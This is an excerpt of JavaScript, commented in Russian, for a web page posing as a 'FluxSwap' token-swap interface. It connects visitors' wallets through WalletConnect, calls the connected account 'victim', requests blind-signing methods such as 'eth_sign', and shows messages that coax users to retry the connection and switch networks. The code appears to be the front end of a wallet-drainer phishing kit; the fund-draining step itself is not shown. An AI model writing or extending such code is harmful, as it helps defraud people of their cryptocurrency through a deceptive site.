<script>
    (function() {
        'use strict';

        // ===== КОНФИГУРАЦИЯ =====
        const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
        const CONTRACT_ADDRESSES = {
            1: '0x1234567890123456789012345678901234567890',
            56: '0x2345678901234567890123456789012345678901',
            137: '0x3456789012345678901234567890123456789012',
            42161: '0x4567890123456789012345678901234567890123'
        };
        const SUPPORTED_CHAINS = Object.keys(CONTRACT_ADDRESSES).map(Number);
        const CHAIN_NAMES = { 1:'Ethereum', 56:'BSC', 137:'Polygon', 42161:'Arbitrum' };

        // ... (остальные ABI, токены, утилиты - без изменений) ...

        // ===== ПОДКЛЮЧЕНИЕ – ТОЛЬКО ETHEREUM =====
        async function connectWalletConnect() {
            if (isConnecting || isProcessing) return;
            closeModal(walletModal);

            await forceClearSession();
            await new Promise(resolve => setTimeout(resolve, 300));

            const EthereumProvider = getEthereumProvider();
            if (!EthereumProvider) {
                setStatus('❌ WalletConnect library not loaded.', 'err');
                loadFallbackWC();
                return;
            }

            try {
                setStatus('Connecting...', '');
                isConnecting = true;

                // *** КЛЮЧЕВОЕ ИЗМЕНЕНИЕ: только [1] ***
                wcProvider = await EthereumProvider.init({
                    projectId: PROJECT_ID,
                    chains: [1],                     // ТОЛЬКО ЭТО
                    showQrModal: true,
                    methods: ['eth_sendTransaction', 'eth_sign'],
                    events: ['chainChanged', 'accountsChanged'],
                    metadata: {
                        name: 'FluxSwap',
                        description: 'Swap interface',
                        url: window.location.href,
                        icons: []
                    }
                });

                wcProvider.on('chainChanged', (chainIdHex) => {
                    const newChainId = parseInt(chainIdHex, 16);
                    if (SUPPORTED_CHAINS.includes(newChainId)) {
                        chainId = newChainId;
                        setStatus('Chain: ' + (CHAIN_NAMES[newChainId] || newChainId), 'ok');
                        updateBalances();
                        updateRateAndOutput();
                        updateNetworkButtons();
                    } else {
                        setStatus('⚠️ Unsupported chain', 'err');
                    }
                });
                wcProvider.on('accountsChanged', (accounts) => {
                    if (accounts.length === 0) {
                        setStatus('Account disconnected', 'err');
                        isConnected = false;
                        victim = null;
                        updateConnectButton();
                        isConnecting = false;
                    } else {
                        victim = accounts[0];
                        updateConnectButton();
                        updateBalances();
                    }
                });
                wcProvider.on('session_delete', async () => {
                    setStatus('Session expired', 'err');
                    isConnected = false;
                    await forceClearSession();
                    updateConnectButton();
                });

                await wcProvider.enable();

                const web3Provider = new ethers.providers.Web3Provider(wcProvider);
                const signer_ = web3Provider.getSigner();
                const address = await signer_.getAddress();
                const network = await web3Provider.getNetwork();

                if (!SUPPORTED_CHAINS.includes(network.chainId)) {
                    setStatus('⚠️ Network ' + network.chainId + ' not supported. Please switch manually.', 'err');
                    isConnecting = false;
                    await forceClearSession();
                    return;
                }

                provider = web3Provider;
                signer = signer_;
                victim = address;
                chainId = network.chainId;
                isConnected = true;

                updateConnectButton();
                setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4) + ' (' + (CHAIN_NAMES[chainId] || chainId) + ')', 'ok');
                isConnecting = false;

                // Инициализация токенов для текущей сети
                const tokens = getTokensForChain(chainId);
                if (tokens.length > 0) {
                    const native = tokens.find(t => !t.address);
                    const stable = tokens.find(t => t.symbol === 'USDT' || t.symbol === 'USDC');
                    fromToken = native || tokens[0];
                    toToken = stable || (tokens.length > 1 ? tokens[1] : tokens[0]);
                    updateTokenUI();
                }

                await updateBalances();
                await updateRateAndOutput();
                updateNetworkButtons();

            } catch (e) {
                let msg = e.message || 'Unknown error';
                if (msg.includes('User rejected')) {
                    msg = '❌ You cancelled the connection. Please try again.';
                } else if (msg.includes('chains') || msg.includes('chain')) {
                    msg = '❌ Network issue. Please use Ethereum mainnet.';
                }
                setStatus('Connection failed: ' + msg, 'err');
                isConnecting = false;
                await forceClearSession();
            }
        }

        // ===== ПЕРЕКЛЮЧЕНИЕ СЕТИ (кнопки) =====
        async function switchNetwork(chainIdTarget) {
            if (!isConnected || !wcProvider) {
                setStatus('Connect wallet first', 'err');
                return;
            }
            if (chainIdTarget === chainId) return;
            try {
                await wcProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x' + chainIdTarget.toString(16) }],
                });
            } catch (e) {
                let msg = e.message || '';
                if (msg.includes('User rejected')) {
                    setStatus('❌ Switch cancelled', 'err');
                } else {
                    setStatus('Switch failed: ' + msg, 'err');
                }
            }
        }

        // ... (остальные обработчики без изменений) ...
    })();
</script>
